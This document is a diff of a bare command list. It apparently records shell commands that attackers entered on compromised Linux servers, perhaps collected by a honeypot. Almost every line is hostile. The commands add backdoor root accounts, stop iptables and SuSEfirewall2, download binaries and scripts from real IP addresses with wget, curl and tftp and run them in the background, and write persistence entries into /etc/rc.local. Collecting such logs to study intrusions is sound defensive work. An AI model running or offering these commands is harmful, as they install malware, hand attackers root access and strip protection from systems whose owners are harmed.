@@ -1,3 +1,101 @@
+id
+useradd -G root hades
+unmeae -r
+uname -r
+exit
+id
+useradd -G root hades
+echo "WinSCP: this is end-of-file:0"
+service iptables stop
+/etc/init.d/iptables stop
+SuSEfirewall2 stop
+reSuSEfirewall2 stop
+wget -O /tmp/Temp http://222.186.129.219:1975/Temp
+nohup /tmp/Temp &gt; /dev/null 9&gt;&amp;1 &amp;
+chmod 777 Temp
+./Temp
+chmod 0755 /tmp/Temp
+nohup /tmp/Temp &amp;gt; /dev/null 9&amp;gt;&amp;amp;1 &amp;amp;
+chmod 0777 Temp
+chmod u+x Temp
+./Temp &amp;
+chmod u+x Temp
+./Temp &amp;
+cd /tmp
+echo &quot;cd  /tmp/&quot;&gt;&gt;/etc/rc.local
+echo &quot;./Temp&amp;&quot;&gt;&gt;/etc/rc.local
+echo &quot;/etc/init.d/iptables stop&quot;&gt;&gt;/etc/rc.local
+chattr +i Temp
+chattr +i /tmp/Temp
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+curl -o /tmp/udp http://23.234.25.140:15826/udp
+/tmp/udp
+/etc/init.d/iptables stop
+service iptables stop
+SuSEfirewall2 stop
+reSuSEfirewall2 stop
+cd /tmp
+wget -c http://115.230.126.87:1268/0407.25535
+chmod 0777 0407.25535
+./0407.25535
+echo "cd /tmp/">>/etc/rc.local
+echo "./0407.25535&">>/etc/rc.local
+echo "/etc/init.d/iptables stop">>/etc/rc.local
+/etc/init.d/iptables stop
+service iptables stop
+SuSEfirewall2 stop
+reSuSEfirewall2 stop
+cd /tmp
+wget -c http://115.230.126.87:1268/0407.25535
+chmod 0777 0407.25535
+./0407.25535
+echo "cd /tmp/">>/etc/rc.local
+echo "./0407.25535&">>/etc/rc.local
+echo "/etc/init.d/iptables stop">>/etc/rc.local
+ifcongfig
+ifconfig
+curl -o /tmp/g251 http://23.234.25.140:15826/g251
+clear
+ls
+perl
+ls
+perl
+clear
+service iptables stop
+wget http://115.231.218.31:888/333
+nohup /root/333 > /dev/null 2>&1 &
+wget http://115.231.218.31:888/222
+nohup /root/222 > /dev/null 2>&1 &
+cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; rm -f *; wget http://199.180.134.199/bin.sh; sh bin.sh; rm -rf bin.sh; tftp -r tftp1.sh -g 199.180.134.199; sh tftp1.sh; tftp 199.180.134.199 -c get tftp2.sh; sh tftp2.sh; rm -rf bin.sh tftp1.sh tftp2.sh
+;s
+ls
+pwd
+wget http://123.1.169.48/aa
+ls
+wget http://123.1.169.48/aa
+wget http://123.1.169.48/aa
+wget http://123.1.169.48/aa
+wget http://123.1.169.48
+wget http://123.1.169.48/aa
+wget http://123.1.169.48/aa
+wget http://123.1.169.48/aa
+chmod 0755 aa
+nohup /root/aa > /dev/null 2>&1 &
+ls
+nohup /root/aa > /dev/null 2>&1 &
+nohup /root/aa > /dev/null 2>&1 &
+nohup /root/aa > /dev/null 2>&1 &
+cd /tmp; rm -rf gb.sh; wget -q http://23.94.97.5/Sharky/gb.sh; sh gb.sh
+cd /tmp; rm -rf gb.sh; wget -q http://23.94.97.5/Sharky/gb.sh; sh gb.sh
+cd /tmp; rm -rf gb.sh; wget -q http://23.94.97.5/Sharky/gb.sh; sh gb.sh
 echo -e test
 `id`
 id
@@ -24,6 +122,14 @@ ls -al
 cat .bashrc 
 wget 123
 wget -O- http://sb.com
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://219.234.6.206:8080/hadess;chmod 777 hadess;./hades;
+service iptables stop
+wget http://115.231.218.25:869/333
+chmod 0755 /root/333
+nohup /root/333 > /dev/null 2>&1 &
+cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; wget http://154.16.63.90/gb.sh; chmod 777 gb.sh; sh gb.sh; tftp -r tftp.sh -g 154.16.63.90; sh tftp.sh; tftp 154.16.63.90 -c get tftp2.sh; sh tftp2.sh; rm -rf gb.sh tftp.sh tftp2.sh
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://222.186.129.248:8080/admin0;chmod 777 admin0;./admin0;
+cd /tmp; rm -rf gb.sh; wget -q http://23.94.97.5/Sharky/gb.sh; sh gb.sh
 uname -m
 uname -r
 useradd -o -u 0 -g 0 -M -d /root -s /bin/bash butter
@@ -132,24 +238,6 @@ cat known_hosts
 exit
 exit
 exit
-;s
-ls
-pwd
-wget http://123.1.169.48/aa
-ls
-wget http://123.1.169.48/aa
-wget http://123.1.169.48/aa
-wget http://123.1.169.48/aa
-wget http://123.1.169.48
-wget http://123.1.169.48/aa
-wget http://123.1.169.48/aa
-wget http://123.1.169.48/aa
-chmod 0755 aa
-nohup /root/aa > /dev/null 2>&1 &
-ls
-nohup /root/aa > /dev/null 2>&1 &
-nohup /root/aa > /dev/null 2>&1 &
-nohup /root/aa > /dev/null 2>&1 &
 curl -o /tmp/g251 http://23.234.25.140:15826/g251
 curl -o /tmp/g251 http://23.234.25.140:15826/g251
 curl -o /tmp/g251 http://23.234.25.140:15826/g251
@@ -321,18 +409,3 @@ id
 /etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://69.12.77.199:92/syn1;chmod 777 syn1;./syn1;
 /etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://69.12.77.199:92/syn;chmod 777 syn;./syn;
 /etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://69.12.77.199:92/roo1;chmod 777 roo1;./roo1;
-ifcongfig
-ifconfig
-curl -o /tmp/g251 http://23.234.25.140:15826/g251
-clear
-ls
-perl
-ls
-perl
-clear
-service iptables stop
-wget http://115.231.218.31:888/333
-nohup /root/333 > /dev/null 2>&1 &
-wget http://115.231.218.31:888/222
-nohup /root/222 > /dev/null 2>&1 &
-cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; rm -f *; wget http://199.180.134.199/bin.sh; sh bin.sh; rm -rf bin.sh; tftp -r tftp1.sh -g 199.180.134.199; sh tftp1.sh; tftp 199.180.134.199 -c get tftp2.sh; sh tftp2.sh; rm -rf bin.sh tftp1.sh tftp2.sh
